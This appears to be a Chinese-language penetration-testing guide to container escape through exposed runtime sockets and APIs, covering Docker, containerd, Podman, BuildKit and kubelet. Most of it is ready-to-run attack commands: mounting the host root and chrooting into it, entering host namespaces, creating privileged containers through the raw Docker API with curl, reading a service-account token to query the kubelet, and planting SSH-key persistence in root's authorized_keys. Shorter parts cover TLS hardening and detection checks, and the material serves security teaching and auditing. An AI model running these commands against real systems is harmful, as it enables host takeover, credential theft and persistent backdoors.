# Runtime API And Daemon 暴露

## 概述

许多真实的 container compromise 根本不是从 namespace escape 开始的，而是从访问 runtime control plane 开始的。如果 workload 能够通过挂载的 Unix socket 或暴露的 TCP listener 与 `dockerd`、`containerd`、CRI-O、Podman 或 kubelet 通信，攻击者可能可以请求创建具有更高权限的新 container、挂载 host filesystem、加入 host namespaces，或检索敏感的 node 信息。在这些情况下，runtime API 才是真正的 security boundary，而 compromise 它在实际效果上接近于 compromise host。

因此，应将 runtime socket 暴露与 kernel protections 分开记录。即使 container 具有普通的 seccomp、capabilities 和 MAC confinement，如果 `/var/run/docker.sock` 或 `/run/containerd/containerd.sock` 被挂载到其中，它仍可能只需一次 API call 就导致 host compromise。当前 container 的 kernel isolation 可能完全按照设计正常工作，但 runtime management plane 仍然完全暴露。

## Daemon 访问模型

Docker Engine 传统上通过本地 Unix socket `unix:///var/run/docker.sock` 暴露其 privileged API。历史上，它也曾通过 `tcp://0.0.0.0:2375` 等 TCP listener，或通过 TLS 保护的 `2376` listener 进行远程暴露。在没有 strong TLS 和 client authentication 的情况下远程暴露 daemon，实际上会将 Docker API 变成一个 remote root interface。

containerd、CRI-O、Podman 和 kubelet 也暴露类似的 high-impact surfaces。名称和工作流有所不同，但逻辑并无区别。如果该 interface 允许调用者创建 workloads、挂载 host paths、检索 credentials 或修改正在运行的 containers，那么该 interface 就是一个 privileged management channel，应按此进行处理。

值得检查的常见本地路径包括：
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
较旧或更专用的 stacks 还可能暴露 `dockershim.sock`、`frakti.sock` 或 `rktlet.sock` 等 endpoints。这些在现代环境中并不常见，但一旦发现它们，也应采取同样的谨慎态度，因为它们代表的是 runtime-control surfaces，而不是普通的 application sockets。

## Secure Remote Access

如果 daemon 必须暴露到本地 socket 之外，则应使用 TLS 保护连接，并最好采用 mutual authentication，使 daemon 验证 client，同时 client 验证 daemon。出于便利而通过 plain HTTP 开放 Docker daemon 的旧习惯，是 container administration 中最危险的错误之一，因为该 API surface 足够强大，可以直接创建 privileged containers。

历史上的 Docker 配置模式如下：
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
在基于 systemd 的主机上，daemon 通信也可能显示为 `fd://`，这表示进程继承了 systemd 预先打开的 socket，而不是自行直接绑定。重要的经验并不在于确切的语法，而在于其安全影响。一旦 daemon 的监听范围超出权限受到严格限制的本地 socket，transport security 和 client authentication 就不再是可选的 hardening，而成为必需。

## Abuse

如果存在 runtime socket，请确认它是哪一个、是否存在兼容的 client，以及是否可以访问 raw HTTP 或 gRPC：
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```
这些命令很有用，因为它们可以区分路径失效、socket 已挂载但无法访问，以及可用的高权限 API。如果客户端成功，接下来的问题就是 API 是否能够通过 host bind mount 或共享 host namespace 启动新容器。

### When No Client Is Installed

没有安装 `docker`、`podman` 或其他友好的 CLI，并不意味着 socket 是安全的。Docker Engine 通过其 Unix socket 使用 HTTP，而 Podman 通过 `podman system service` 同时提供与 Docker 兼容的 API 和 Libpod 原生 API。这意味着，一个仅包含 `curl` 的 minimal environment 可能仍然足以驱动 daemon：
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
-X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```
这在 post-exploitation 阶段很重要，因为 defenders 有时会移除常用的 client binaries，却留下已挂载的 management socket。在 Podman hosts 上，请记住 high-value path 会因 rootful 和 rootless 部署而不同：rootful service instances 使用 `unix:///run/podman/podman.sock`，rootless 使用 `unix://$XDG_RUNTIME_DIR/podman/podman.sock`。

### 完整示例：Docker Socket 到 Host Root

如果可以访问 `docker.sock`，经典的 escape 方法是启动一个挂载 host root filesystem 的新 container，然后对其执行 `chroot`：
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
这通过 Docker daemon 提供了直接以 host-root 身份执行的能力。其影响并不局限于读取文件。进入新 container 后，攻击者可以修改主机文件、窃取 credentials、植入 persistence，或启动其他 privileged workloads。

### 完整示例：从 Docker Socket 进入主机 Namespaces

如果攻击者更倾向于进入 namespace，而不是仅访问文件系统：
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
此路径通过要求 runtime 创建一个明确暴露 host namespace 的新 container 来触达 host，而不是利用当前 container。

### Docker Socket Persistence Pattern

Runtime control 也可用于 persistence，而不只是执行一次性 shell。通用模式是创建一个带有 host mount 的 helper container，将 authorized access material 或 startup hook 写入挂载的 host filesystem，然后验证 host 是否会使用它。

示例结构：
```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```
同样的思路也可以根据 operator 想要证明的内容，针对 systemd units、cron fragments、application startup files 或 SSH keys。重要的是，persistent change 是通过 runtime daemon 的 host-level filesystem authority 完成的，而不是通过原始 container 中的额外 privilege 完成的。

### Raw Docker API Helper Pivot

当 Docker CLI 缺失时，可以通过 Unix socket 上的 HTTP，以相同的 host-mount helper flow 进行操作。通用流程是：确认 API，创建一个带有 host bind mount 的 helper container，启动它，创建一个 exec instance，然后启动该 exec。
```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
-X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
-H 'Content-Type: application/json' \
-d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
-X POST http://localhost/v1.54/containers/helper/exec
```
最终的 `/exec/<id>/start` 请求依赖返回的 exec ID，但安全要点与确切的 JSON 处理流程无关：对 rootful Docker daemon 的原始 API 访问，足以请求一个权限更强的 helper workload。

### 完整示例：containerd Socket

挂载的 `containerd` Socket 通常同样危险：<sup>[[1]](#references)</sup>
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
如果存在更类似 Docker 的 client，`nerdctl` 可能比 `ctr` 更方便，因为它提供了 `--privileged`、`--pid=host` 和 `-v` 等熟悉的 flags：
```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
--privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```
影响同样是 host compromise。即使缺少 Docker-specific tooling，另一个 runtime API 仍可能提供相同的管理权限。在 Kubernetes 节点上，`crictl` 也可能足以用于 reconnaissance 和 container interaction，因为它直接与 CRI endpoint 通信。

### BuildKit Socket

`buildkitd` 很容易被忽略，因为人们常常认为它“只是 build backend”，但该 daemon 仍然是一个具有特权的 control plane。可访问的 `buildkitd.sock` 可能允许攻击者运行任意 build steps、检查 worker capabilities、使用 compromised environment 中的 local contexts，并在 daemon 配置为允许这些权限时请求 `network.host` 或 `security.insecure` 等危险 entitlements。

有用的初始交互包括：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```
如果 daemon 接受 build 请求，请测试是否可用不安全的 entitlements：
```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
--frontend dockerfile.v0 \
--local context=. \
--local dockerfile=. \
--allow network.host \
--allow security.insecure \
--output type=local,dest=/tmp/buildkit-out
```
具体影响取决于 daemon 配置，但具有宽松 entitlements 的 rootful BuildKit 服务并不是无害的开发便利工具。应将其视为另一个高价值的管理面，尤其是在 CI runners 和共享构建节点上。

### 通过 TCP 访问 Kubelet API

kubelet 不是 container runtime，但它仍属于节点管理面，通常也处于同一信任边界的讨论范围内。如果 workload 可以访问 kubelet 的安全端口 `10250`，或者节点凭据、kubeconfigs 或 proxy 权限暴露，攻击者可能无需接触 Kubernetes API server 的 admission path，就能枚举 Pods、获取日志，或在节点本地的 containers 中执行命令。

先从低成本的发现开始：
```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```
如果 kubelet 或 API-server proxy 路径为 `exec` 授权，支持 WebSocket 的客户端就可以将其转化为在节点上其他容器中执行代码的能力。这也是为什么仅具有 `get` 权限的 `nodes/proxy` 比听起来更加危险：请求仍然可以到达能够执行命令的 kubelet endpoints，而这些直接与 kubelet 的交互不会出现在常规 Kubernetes audit logs 中。<sup>[[2]](#references)</sup>

## 检查

这些检查旨在确认容器是否能够访问任何本应位于 trust boundary 之外的管理平面。
```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```
这里的重点：

- 挂载的 runtime socket 通常是直接的管理权限原语，而不仅仅是信息泄露。
- 未启用 TLS 的 `2375` TCP listener 应被视为远程 compromise 条件。
- `DOCKER_HOST` 等环境变量通常表明该 workload 是有意设计为与宿主机 runtime 通信的。

## Runtime Defaults

| Runtime / platform | 默认状态 | 默认行为 | 常见的手动弱化方式 |
| --- | --- | --- | --- |
| Docker Engine | 默认使用本地 Unix socket | `dockerd` 监听本地 socket，且 daemon 通常以 rootful 模式运行 | 挂载 `/var/run/docker.sock`、暴露 `tcp://...:2375`、`2376` 上的 TLS 弱或缺失 |
| Podman | 默认使用无 daemon 的 CLI | 普通本地使用不需要长期运行的特权 daemon；启用 `podman system service` 后仍可能暴露 API socket | 暴露 `podman.sock`、广泛运行该 service、使用 rootful API |
| containerd | 本地特权 socket | 管理 API 通过本地 socket 暴露，通常由更高层工具使用 | 挂载 `containerd.sock`、授予广泛的 `ctr` 或 `nerdctl` 访问权限、暴露特权 namespace |
| CRI-O | 本地特权 socket | CRI endpoint 旨在供节点本地的可信组件使用 | 挂载 `crio.sock`、向不可信 workload 暴露 CRI endpoint |
| Kubernetes kubelet | 节点本地管理 API | Kubelet 不应被 Pods 广泛访问；根据 authentication 和 authorization 配置，访问可能暴露 pod 状态、凭据和执行功能 | 挂载 kubelet socket 或证书、kubelet authentication 薄弱、使用 host networking 并访问 kubelet endpoint |

## References

- [1] [containerd socket exploitation part 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Kubernetes API Server Bypass Risks](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
